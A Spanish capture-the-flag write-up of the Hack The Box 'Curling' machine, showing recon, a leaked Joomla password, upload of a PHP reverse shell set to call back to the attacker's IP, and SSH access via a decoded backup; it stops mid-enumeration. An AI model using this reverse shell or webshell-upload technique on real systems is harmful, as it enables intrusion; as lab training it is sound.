---
title: Hack The Box Curling
author: k4miyo
date: 2022-03-18
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Easy, Linux]
tags: [PHP]
ping: true
---

## Curling
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.10.150.

```bash
❯ ping -c 1 10.10.10.150
PING 10.10.10.150 (10.10.10.150) 56(84) bytes of data.
64 bytes from 10.10.10.150: icmp_seq=1 ttl=63 time=135 ms

--- 10.10.10.150 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 134.865/134.865/134.865/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -T5 -v -n 10.10.10.150 -oG allPorts
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-18 14:10 CST
Initiating Ping Scan at 14:10
Scanning 10.10.10.150 [4 ports]
Completed Ping Scan at 14:10, 0.15s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 14:10
Scanning 10.10.10.150 [65535 ports]
Discovered open port 80/tcp on 10.10.10.150
Discovered open port 22/tcp on 10.10.10.150
Completed SYN Stealth Scan at 14:11, 35.08s elapsed (65535 total ports)
Nmap scan report for 10.10.10.150
Host is up (0.13s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 35.37 seconds
           Raw packets sent: 69583 (3.062MB) | Rcvd: 69523 (2.781MB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬─────────────────────────────────────
       │ File: extractPorts.tmp
       │ Size: 117 B
───────┼─────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.150
   5   │     [*] Open ports: 22,80
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sCV -p22,80 10.10.10.150 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-18 14:14 CST
Nmap scan report for 10.10.10.150
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)
|   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)
|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Home
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.26 seconds
```

Vemos el puerto 80 abierto, por lo tanto, vamos a que a lo que nos enfrentamos con `whatweb`:

```bash
❯ whatweb http://10.10.10.150/
http://10.10.10.150/ [200 OK] Apache[2.4.29], Bootstrap, Cookies[c0548020854924e0aecd05ed9f5b672b], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], HttpOnly[c0548020854924e0aecd05ed9f5b672b], IP[10.10.10.150], JQuery, MetaGenerator[Joomla! - Open Source Content Management], PasswordField[password], Script[application/json], Title[Home]
```

Vemos que nos enfrentamos ante un CMS **Joomla!** que investigando un poco, tenemos que el usuario default es **admin** y el panel de login se encuentra bajo el recurso `/administrator`, por lo que vamos a validar si existe dicho recurso haciendo un *fuzzing* con `nmap`:

```bash
❯ nmap --script http-enum -p80 10.10.10.150 -oN webScan
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-18 14:41 CST
Nmap scan report for 10.10.10.150
Host is up (0.13s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /administrator/: Possible admin folder
|   /administrator/index.php: Possible admin folder
|   /administrator/manifests/files/joomla.xml: Joomla version 3.8.8
|   /language/en-GB/en-GB.xml: Joomla version 3.8.8
|   /htaccess.txt: Joomla!
|   /README.txt: Interesting, a readme.
|   /bin/: Potentially interesting folder
|   /cache/: Potentially interesting folder
|   /images/: Potentially interesting folder
|   /includes/: Potentially interesting folder
|   /libraries/: Potentially interesting folder
|   /modules/: Potentially interesting folder
|   /templates/: Potentially interesting folder
|_  /tmp/: Potentially interesting folder

Nmap done: 1 IP address (1 host up) scanned in 13.55 seconds
```

Checando la página web.

![](/assets/images/htb-curling/curling-web.png)

Si vemos el código fuente de la página, hasta el final vemos un comentario apuntando a recurso `secret.txt`:

![](/assets/images/htb-curling/curling-web1.png)

Vamos a echarle un ojo a ese recurso.

![](/assets/images/htb-curling/curling-web2.png)

Tenemos una cadena de texto posiblemente en base 64, así que la desciframo:

```bash
❯ echo "Q3VybGluZzIwMTgh" | base64 -d; echo
Curling2018!
```

Tenemos una posible contraseña pero no sabemos a que usuario está destinana; por lo tanto, vamos a echarle un ojo a las publicaciones por si encontramos algo interesante.

![](/assets/images/htb-curling/curling-web3.png)

Tenemos usuarios potenciales a probar, como por ejemplo: **superuser**, **super.user**, **admin**, **administrator** y **floris**. Al probarlas, tenemos que la combinación es **floris : Curling2018!**; por lo tanto vamos a loguearnos bajo el panel de administración de **Joomla!**:

![](/assets/images/htb-curling/curling-web4.png)

Vemos que nos enfrentamos ante un **Joomla 3.8.8**, por lo que investigando un poco, encontramos una forma de subir un archivo php que nos permita ejecutar obtener una reverse shell [hackingarticles](https://www.hackingarticles.in/joomla-reverse-shell/). Siguiendo el artículo, nos dice que debemos navegar en **Extensions > Templates**:

![](/assets/images/htb-curling/curling-web5.png)

Seleccionamos de la tabla que nos parace aquel que no está asginado (**Beez3 - Default**) en el campo de **Template**:

![](/assets/images/htb-curling/curling-web6.png)

Antes de generar un archivo, vamos a descargarnos una reverse shell de [pentestmonkey](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)

```bash
❯ mv /home/k4miyo/Descargas/Firefox/php-reverse-shell-1.0.tar.gz .
❯ ll
.rw-r--r-- root   root    22 B  Fri Mar 18 14:36:07 2022  credentials.txt
.rw-r--r-- k4miyo k4miyo 8.8 KB Fri Mar 18 14:49:25 2022  php-reverse-shell-1.0.tar.gz
❯ tar -xf php-reverse-shell-1.0.tar.gz
❯ ll
drwx------ k4miyo 1004   132 B  Sat May 26 11:50:01 2007  php-reverse-shell-1.0
.rw-r--r-- root   root    22 B  Fri Mar 18 14:36:07 2022  credentials.txt
.rw-r--r-- k4miyo k4miyo 8.8 KB Fri Mar 18 14:49:25 2022  php-reverse-shell-1.0.tar.gz
❯ cd php-reverse-shell-1.0
❯ ll
.rw------- k4miyo 1004  62 B  Sat May 26 11:50:01 2007  CHANGELOG
.rw------- k4miyo 1004  18 KB Sat May 26 11:50:01 2007  COPYING.GPL
.rw------- k4miyo 1004 308 B  Sat May 26 11:50:01 2007  COPYING.PHP-REVERSE-SHELL
.rwx------ k4miyo 1004 5.4 KB Sat May 26 11:50:01 2007  php-reverse-shell.php
```

Editamos el archivo `php-reverse-shell.php` modificando los valores que nos indica.

```bash
  47   │ set_time_limit (0);
  48   │ $VERSION = "1.0";
  49   │ $ip = '10.10.14.27';  // CHANGE THIS
  50   │ $port = 443;       // CHANGE THIS
  51   │ $chunk_size = 1400;
  52   │ $write_a = null;
  53   │ $error_a = null;
  54   │ $shell = 'uname -a; w; id; /bin/sh -i';
  55   │ $daemon = 0;
  56   │ $debug = 0;

```

Ahora creamos un nuevo archivo en **New File** dentro del CMS y llenamos los campos que nos solicita, **File Name**, **Extension** y le damos en **Create*.

![](/assets/images/htb-curling/curling-web7.png)

En el cuadro de texto que nos aparece, copiamos el pegamos el contenido del archivo `php-reverse-shell.php` y guardamos los cambios:

![](/assets/images/htb-curling/curling-web8.png)

Ahora, para apuntar a nuestro archivo, debemos recordar que el *fuzzing* de `nmap` existe un recurso llamado `templates` y como nos encontramos dentro de dicha sección, podriamos pensar que igual en dicho recurso está nuestro archivo. Por lo tanto apuntamos a nuestro archivo y nos ponemos en escucha por el puerto 443:

```bash
http://10.10.10.150/templates/beez3/k4mishell.php
```

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.150] 39842
Linux curling 4.15.0-156-generic #163-Ubuntu SMP Thu Aug 19 23:31:58 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 21:01:34 up 52 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$
```

Ya nos encontramos dentro de la máquina como el usuario **www-data** y antes de cualquier otra cosa, vamos a realizar un [Tratamiento de la tty](/posts/tratamiento-tty).  Ahora, si ingresamos al directorio del usuario **floris**, vemos que tenemos permisos de lectura sobre el archivo `password_backup` y encontramos que se encuentra en formato hexadecimal.

```bash
www-data@curling:/home/floris$ ls -l
total 12
drwxr-x--- 2 root   floris 4096 May 22  2018 admin-area
-rw-r--r-- 1 floris floris 1076 May 22  2018 password_backup
-rw-r----- 1 floris floris   33 May 22  2018 user.txt
www-data@curling:/home/floris$ cat password_backup 
00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&SY...H..
00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:4
00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`
00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000   ......z.@......
00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800  ..i.4hdi...9.h..
00000050: 000f 51a0 0064 681a 069e a190 0000 0034  ..Q..dh........4
00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  i...5.n......J..
00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  .h...*..}y..<~.x
00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931  .>...sVT.zH....1
00000090: c856 921b 1221 3385 6046 a2dd c173 0d22  .V...!3.`F...s."
000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290  ..n....7j:X.d.R.
000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503  .k./... ....)p..
000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843  7..;.....9...P.C
000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..
000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.
000000f0: 819b bb48                                ...H
www-data@curling:/home/floris$
```

Vamos a traernos dicho archivo de nuestra máquina para trabajar más cómodos. Revertimos el archivo con `xxd`:

```bash
❯ cat password_backup | xxd -ps -r
BZh91AY&SYHAP)ava:4 NnT#@%`0 
"n                           z@@i4hdi9hPQdh4`i5nJh*}y.<~x>      sVTzHߢ1V`Fs
  ۇ7j:XdRk )p7۫;9PCЂYP   HB*     G U@rrE8PH# 
```

Vemos que está medio raro el resultado, así que vamos a exportarlo a un archivo.

```bash
❯ cat password_backup | xxd -ps -r > data
❯ file data
data: data
```

Al aplicar el comando `file` sobre el archivo `data` tenemos que nos indica **data**; así que vamos a exportar otro archivo pero quitando los parámetros `-ps`:

```bash
❯ cat password_backup | xxd -r > data2
❯ file data2
data2: bzip2 compressed data, block size = 900k
```

Por medio de los ***Magic Numbers*** vemos que es un archivo comprimido **bzip2**; por lo tanto, vamos a descomprimirlo.

```bash
❯ 7z x data2

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_MX.UTF-8,Utf16=on,HugeFiles=on,64 bits,8 CPUs AMD Ryzen 7 PRO 4750G with Radeon Graphics (860F01),ASM,AES-NI)

Scanning the drive for archives:
1 file, 244 bytes (1 KiB)

Extracting archive: data2
--
Path = data2
Type = bzip2

Everything is Ok

Size:       173
Compressed: 244
❯ ll
drwx------ k4miyo 1004 132 B  Fri Mar 18 14:51:39 2022  php-reverse-shell-1.0
.rw-r--r-- root   root  22 B  Fri Mar 18 14:36:07 2022  credentials.txt
.rw-r--r-- root   root 309 B  Fri Mar 18 15:16:14 2022  data
.rw-r--r-- root   root 244 B  Fri Mar 18 15:17:37 2022  data2
.rw-r--r-- root   root 173 B  Fri Mar 18 15:17:37 2022  data2~
.rw-r--r-- root   root 1.1 KB Fri Mar 18 15:13:10 2022  password_backup
```

Vemos que nos generó el archivo `data2~`:

```bash
❯ file data2~
data2~: gzip compressed data, was "password", last modified: Tue May 22 19:16:20 2018, from Unix, original size modulo 2^32 141
```

Vemos que se trata de otro archivo comprimido, así que vamos a descomprimirlo:

```bash
❯ 7z x data2~

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_MX.UTF-8,Utf16=on,HugeFiles=on,64 bits,8 CPUs AMD Ryzen 7 PRO 4750G with Radeon Graphics (860F01),ASM,AES-NI)

Scanning the drive for archives:
1 file, 173 bytes (1 KiB)

Extracting archive: data2~
--
Path = data2~
Type = gzip
Headers Size = 19

Everything is Ok

Size:       141
Compressed: 173
❯ ll
drwx------ k4miyo 1004 132 B  Fri Mar 18 14:51:39 2022  php-reverse-shell-1.0
.rw-r--r-- root   root  22 B  Fri Mar 18 14:36:07 2022  credentials.txt
.rw-r--r-- root   root 309 B  Fri Mar 18 15:16:14 2022  data
.rw-r--r-- root   root 244 B  Fri Mar 18 15:17:37 2022  data2
.rw-r--r-- root   root 173 B  Fri Mar 18 15:17:37 2022  data2~
.rw-r--r-- root   root 141 B  Tue May 22 14:16:20 2018  password
.rw-r--r-- root   root 1.1 KB Fri Mar 18 15:13:10 2022  password_backup
```

Tenemos el archivo **password** el cual parece ser otro archivo comprimido:

```bash
❯ file password
password: bzip2 compressed data, block size = 900k
```

Lo descomprimimos.

```bash
❯ 7z x password

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_MX.UTF-8,Utf16=on,HugeFiles=on,64 bits,8 CPUs AMD Ryzen 7 PRO 4750G with Radeon Graphics (860F01),ASM,AES-NI)

Scanning the drive for archives:
1 file, 141 bytes (1 KiB)

Extracting archive: password
--
Path = password
Type = bzip2

Everything is Ok

Size:       10240
Compressed: 141
❯ ll
drwx------ k4miyo 1004 132 B  Fri Mar 18 14:51:39 2022  php-reverse-shell-1.0
.rw-r--r-- root   root  22 B  Fri Mar 18 14:36:07 2022  credentials.txt
.rw-r--r-- root   root 309 B  Fri Mar 18 15:16:14 2022  data
.rw-r--r-- root   root 244 B  Fri Mar 18 15:17:37 2022  data2
.rw-r--r-- root   root 173 B  Fri Mar 18 15:17:37 2022  data2~
.rw-r--r-- root   root 141 B  Tue May 22 14:16:20 2018  password
.rw-r--r-- root   root 1.1 KB Fri Mar 18 15:13:10 2022  password_backup
.rw-r--r-- root   root  10 KB Tue May 22 14:16:20 2018  password~
❯ file password~
password~: POSIX tar archive (GNU)
```

Tenemos una vez maś otro comprimido, lo volvemos a descomprimir:

```bash
❯ 7z x password~

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_MX.UTF-8,Utf16=on,HugeFiles=on,64 bits,8 CPUs AMD Ryzen 7 PRO 4750G with Radeon Graphics (860F01),ASM,AES-NI)

Scanning the drive for archives:
1 file, 10240 bytes (10 KiB)

Extracting archive: password~
--
Path = password~
Type = tar
Physical Size = 10240
Headers Size = 9728
Code Page = UTF-8

Everything is Ok

Size:       19
Compressed: 10240
❯ ll
drwx------ k4miyo 1004 132 B  Fri Mar 18 14:51:39 2022  php-reverse-shell-1.0
.rw-r--r-- root   root  22 B  Fri Mar 18 14:36:07 2022  credentials.txt
.rw-r--r-- root   root 309 B  Fri Mar 18 15:16:14 2022  data
.rw-r--r-- root   root 244 B  Fri Mar 18 15:17:37 2022  data2
.rw-r--r-- root   root 173 B  Fri Mar 18 15:17:37 2022  data2~
.rw-r--r-- root   root 141 B  Tue May 22 14:16:20 2018  password
.rw-r--r-- root   root  19 B  Tue May 22 14:15:47 2018  password.txt
.rw-r--r-- root   root 1.1 KB Fri Mar 18 15:13:10 2022  password_backup
.rw-r--r-- root   root  10 KB Tue May 22 14:16:20 2018  password~
```

Ya tenemos un `password.txt` que al abrirlo vemos la contraseña posiblemente del usuario **floris**; por lo tanto vamos a tratar de conectarnos por ssh:

```bash
❯ ssh floris@10.10.10.150
The authenticity of host '10.10.10.150 (10.10.10.150)' can't be established.
ECDSA key fingerprint is SHA256:o1Cqn+GlxiPRiKhany4ZMStLp3t9ePE9GjscsUsEjWM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.150' (ECDSA) to the list of known hosts.
floris@10.10.10.150's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-156-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Mar 18 21:26:27 UTC 2022

  System load:  0.0               Processes:            172
  Usage of /:   49.2% of 9.78GB   Users logged in:      0
  Memory usage: 22%               IP address for ens33: 10.10.10.150
  Swap usage:   0%


0 updates can be applied immediately.


Last login: Wed Sep  8 11:42:07 2021 from 10.10.14.15
floris@curling:~$ whoami
floris
floris@curling:~$
```

Ahora si ya somos el usuario **floris** y podemos visualizar la flag (user.txt). Vamos a enumerar un poco el sistema para ver de que forma podemos escalar privilegios.

```bash
floris@curling:~$ id
uid=1000(floris) gid=1004(floris) groups=1004(floris)
floris@curling:~$ sudo -l
[sudo] password for floris: 
floris@curling:~$ cd /
floris@curling:/$ find \-perm -4000 2>/dev/null
./snap/core/4486/bin/mount
./snap/core/4486/bin/ping
./snap/core/4486/bin/ping6
./snap/core/4486/bin/su
./snap/core/4486/bin/umount
./snap/core/4486/usr/bin/chfn
./snap/core/4486/usr/bin/chsh
./snap/core/4486/usr/bin/gpasswd
./snap/core/4486/usr/bin/newgrp
./snap/core/4486/usr/bin/passwd
./snap/core/4486/usr/bin/sudo
./snap/core/4486/usr/lib/dbus-1.0/dbus-daemon-launch-helper
./snap/core/4486/usr/lib/openssh/ssh-keysign
./snap/core/4486/usr/lib/snapd/snap-confine
./snap/core/4486/usr/sbin/pppd
./usr/lib/openssh/ssh-keysign
./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
./usr/lib/snapd/snap-confine
./usr/lib/eject/dmcrypt-get-device
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/bin/newgidmap
./usr/bin/chsh
./usr/bin/pkexec
./usr/bin/chfn
./usr/bin/newuidmap
./usr/bin/newgrp
./usr/bin/gpasswd
./usr/bin/at
./usr/bin/passwd
./usr/bin/sudo
./usr/bin/traceroute6.iputils
./bin/umount
./bin/fusermount
./bin/su
./bin/ping
./bin/mount
floris@curling:/$
```

Vemos el binario `pkexec` con permisos SUID y podríamos tratar de explotar ***PwnKit # CVE-2021-4034***; sin embargo, vamos a resolver la máquina de la forma como fue pensada. Por lo tanto, vamos a observar procesos que se estén ejecutando en el sistema a intervalos regulares y lo haremos con [pspy](https://github.com/DominicBreuker/pspy). Nos descargamos el repositorio:

```bash
❯ git clone https://github.com/DominicBreuker/pspy
Clonando en 'pspy'...
remote: Enumerating objects: 1087, done.
remote: Counting objects: 100% (61/61), done.
remote: Compressing objects: 100% (37/37), done.
remote: Total 1087 (delta 31), reused 37 (delta 21), pack-reused 1026
Recibiendo objetos: 100% (1087/1087), 9.28 MiB | 8.69 MiB/s, listo.
Resolviendo deltas: 100% (483/483), listo.
```

Compilamos:

```bash
❯ cd pspy/
❯ go mod init github.com/DominicBreuker/pspy
go: creating new go.mod: module github.com/DominicBreuker/pspy
go: copying requirements from Gopkg.lock
go: to add module requirements and sums:
        go mod tidy
❯ GOOS=linux GOARCH=amd64 go build -ldflags "-s -w" -mod=mod .
go: finding module for package github.com/dominicbreuker/pspy/cmd
go: found github.com/dominicbreuker/pspy/cmd in github.com/dominicbreuker/pspy v1.2.0
❯ ll
drwxr-xr-x root root  14 B  Fri Mar 18 15:31:34 2022  cmd
drwxr-xr-x root root 302 B  Fri Mar 18 15:31:34 2022  docker
drwxr-xr-x root root  32 B  Fri Mar 18 15:31:34 2022  images
drwxr-xr-x root root  70 B  Fri Mar 18 15:31:34 2022  internal
drwxr-xr-x root root  40 B  Fri Mar 18 15:31:34 2022  vendor
.rw-r--r-- root root 259 B  Fri Mar 18 15:34:51 2022  go.mod
.rw-r--r-- root root 811 B  Fri Mar 18 15:34:51 2022  go.sum
.rw-r--r-- root root 870 B  Fri Mar 18 15:31:34 2022  Gopkg.lock
.rw-r--r-- root root 800 B  Fri Mar 18 15:31:34 2022  Gopkg.toml
.rw-r--r-- root root  34 KB Fri Mar 18 15:31:34 2022  LICENSE
.rw-r--r-- root root 211 B  Fri Mar 18 15:31:34 2022  main.go
.rw-r--r-- root root 3.4 KB Fri Mar 18 15:31:34 2022  Makefile
.rwxr-xr-x root root 2.6 MB Fri Mar 18 15:34:52 2022  pspy
.rw-r--r-- root root 8.6 KB Fri Mar 18 15:31:34 2022  README.md
```

Reducimos el tamaña del binario `pspy` con `upx`:

```bash
❯ upx brute pspy
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2020
UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
upx: brute: FileNotFoundException: brute: No such file or directory
   2752512 ->   1060368   38.52%   linux/amd64   pspy                          

Packed 1 file.
❯ ll
drwxr-xr-x root root  14 B  Fri Mar 18 15:31:34 2022  cmd
drwxr-xr-x root root 302 B  Fri Mar 18 15:31:34 2022  docker
drwxr-xr-x root root  32 B  Fri Mar 18 15:31:34 2022  images
drwxr-xr-x root root  70 B  Fri Mar 18 15:31:34 2022  internal
drwxr-xr-x root root  40 B  Fri Mar 18 15:31:34 2022  vendor
.rw-r--r-- root root 259 B  Fri Mar 18 15:34:51 2022  go.mod
.rw-r--r-- root root 811 B  Fri Mar 18 15:34:51 2022  go.sum
.rw-r--r-- root root 870 B  Fri Mar 18 15:31:34 2022  Gopkg.lock
.rw-r--r-- root root 800 B  Fri Mar 18 15:31:34 2022  Gopkg.toml
.rw-r--r-- root root  34 KB Fri Mar 18 15:31:34 2022  LICENSE
.rw-r--r-- root root 211 B  Fri Mar 18 15:31:34 2022  main.go
.rw-r--r-- root root 3.4 KB Fri Mar 18 15:31:34 2022  Makefile
.rwxr-xr-x root root 1.0 MB Fri Mar 18 15:34:52 2022  pspy
.rw-r--r-- root root 8.6 KB Fri Mar 18 15:31:34 2022  README.md
```

Ahora si lo tranferimos a la máquina víctima bajo un directorio donde tengamos permisos:

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.150 - - [18/Mar/2022 15:36:46] "GET /pspy HTTP/1.1" 200 -
```

```bash
floris@curling:/$ cd /dev/shm/
floris@curling:/dev/shm$ wget http://10.10.14.27/pspy pspy
--2022-03-18 21:36:45--  http://10.10.14.27/pspy
Connecting to 10.10.14.27:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1060368 (1.0M) [application/octet-stream]
Saving to: ‘pspy’

pspy                             100%[=======================================================>]   1.01M  1.22MB/s    in 0.8s    

2022-03-18 21:36:46 (1.22 MB/s) - ‘pspy’ saved [1060368/1060368]

--2022-03-18 21:36:46--  http://pspy/
Resolving pspy (pspy)... failed: Temporary failure in name resolution.
wget: unable to resolve host address ‘pspy’
FINISHED --2022-03-18 21:36:46--
Total wall clock time: 1.1s
Downloaded: 1 files, 1.0M in 0.8s (1.22 MB/s)
floris@curling:/dev/shm$
```

Le damos permisos de ejecución:

```bash
floris@curling:/dev/shm$ ls -l
total 1036
-rw-rw-r-- 1 floris floris 1060368 Mar 18 21:34 pspy
floris@curling:/dev/shm$ chmod +x pspy 
floris@curling:/dev/shm$
```

Y ahora si procedemos a ejecutarlo.

```bash
floris@curling:/dev/shm$ ./pspy                                                                                                  
pspy - version:  - Commit SHA:                                                                                                   
                                                                
                                                                                                                                 
     ██▓███    ██████  ██▓███ ▓██   ██▓                                                                                          
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒                                                                                          
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░                                                                                          
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░                                                                                          
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░                                                                                          
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒                                                                                           
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░                                                                                           
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░                                                                                            
                   ░           ░ ░                                                                                               
                               ░ ░                                                                                               
                                                                                                                                 Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on 
inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)                       
Draining file system events due to startup...                                                                                    
done                                                                                                                             
2022/03/18 21:38:11 CMD: UID=103  PID=986    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-ac
tivation --syslog-only                                                                                                           
2022/03/18 21:38:11 CMD: UID=0    PID=969    | /usr/sbin/atd -f  
2022/03/18 21:38:11 CMD: UID=0    PID=96     |                                                                                   
2022/03/18 21:38:11 CMD: UID=0    PID=90     |    
2022/03/18 21:38:11 CMD: UID=0    PID=9      |                                                                                   2022/03/18 21:38:11 CMD: UID=0    PID=89     |                                                                                   
2022/03/18 21:38:11 CMD: UID=0    PID=88     |                                                                                   
2022/03/18 21:38:11 CMD: UID=0    PID=87     |    
2022/03/18 21:38:11 CMD: UID=0    PID=86     |                                                                                   
2022/03/18 21:38:11 CMD: UID=0    PID=85     |                                                                                   
2022/03/18 21:38:11 CMD: UID=101  PID=830    | /lib/systemd/systemd-resolved                                                     
2022/03/18 21:38:11 CMD: UID=100  PID=809    | /lib/systemd/systemd-networkd                                                     
2022/03/18 21:38:11 CMD: UID=0    PID=8      |                                                                                   
2022/03/18 21:38:11 CMD: UID=0    PID=7      |                                                                                   2022/03/18 21:38:11 CMD: UID=0    PID=635    | /usr/bin/vmtoolsd 
2022/03/18 21:38:11 CMD: UID=0    PID=634    | /usr/bin/VGAuthService                                                            
2022/03/18 21:38:11 CMD: UID=0    PID=6      |                                                                                   2022/03/18 21:38:11 CMD: UID=62583 PID=581    | /lib/systemd/systemd-timesyncd                                                   
2022/03/18 21:38:11 CMD: UID=0    PID=546    |                                                                                   2022/03/18 21:38:11 CMD: UID=0    PID=521    |                                                                                   
2022/03/18 21:38:11 CMD: UID=0    PID=518    | /lib/systemd/systemd-udevd                                                        2022/03/18 21:38:11 CMD: UID=0    PID=517    | 
2022/03/18 21:38:11 CMD: UID=0    PID=515    |            
2022/03/18 21:38:11 CMD: UID=0    PID=514    |                                                                                   2022/03/18 21:38:11 CMD: UID=0    PID=512    |                                                                                   
2022/03/18 21:38:11 CMD: UID=0    PID=504    | /sbin/lvmetad -f                                                                  2022/03/18 21:38:11 CMD: UID=0    PID=502    |                                                                                   
2022/03/18 21:38:11 CMD: UID=0    PID=498    | /lib/systemd/systemd-journald                                                     
2022/03/18 21:38:11 CMD: UID=0    PID=43     |                                                                                   
2022/03/18 21:38:11 CMD: UID=1000 PID=4240   | ./pspy
---
2022/03/18 21:48:10 CMD: UID=0    PID=1108   | /usr/lib/policykit-1/polkitd --no-debug 
2022/03/18 21:48:10 CMD: UID=0    PID=11     | 
2022/03/18 21:48:10 CMD: UID=0    PID=1092   | /usr/sbin/sshd -D 
2022/03/18 21:48:10 CMD: UID=0    PID=1079   | /usr/sbin/cron -f 
2022/03/18 21:48:10 CMD: UID=102  PID=1051   | /usr/sbin/rsyslogd -n 
2022/03/18 21:48:10 CMD: UID=0    PID=105    | 
2022/03/18 21:48:10 CMD: UID=0    PID=1046   | /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers 
2022/03/18 21:48:10 CMD: UID=0    PID=1036   | /lib/systemd/systemd-logind 
2022/03/18 21:48:10 CMD: UID=0    PID=1035   | /usr/lib/snapd/snapd 
2022/03/18 21:48:10 CMD: UID=0    PID=1034   | /usr/sbin/irqbalance --foreground 
2022/03/18 21:48:10 CMD: UID=0    PID=1015   | /usr/bin/lxcfs /var/lib/lxcfs/ 
2022/03/18 21:48:10 CMD: UID=0    PID=1012   | /usr/lib/accountsservice/accounts-daemon 
2022/03/18 21:48:10 CMD: UID=0    PID=10     | 
2022/03/18 21:48:10 CMD: UID=0    PID=1      | /sbin/init maybe-ubiquity 
2022/03/18 21:49:01 CMD: UID=0    PID=4440   | /usr/sbin/CRON -f 
2022/03/18 21:49:01 CMD: UID=0    PID=4439   | sleep 1 
